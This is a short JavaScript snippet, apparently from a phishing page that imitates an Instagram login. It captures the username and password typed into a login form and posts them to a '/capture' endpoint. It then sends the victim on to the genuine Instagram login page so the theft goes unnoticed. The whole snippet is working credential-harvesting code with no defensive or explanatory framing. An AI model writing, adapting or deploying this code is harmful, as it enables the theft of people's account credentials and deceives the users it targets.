document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send the credentials to your server
    fetch('http://localhost:3000/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username: username, password: password }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Redirect the user to the real Instagram login page
        window.location.href = 'https://www.instagram.com/accounts/login/';
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});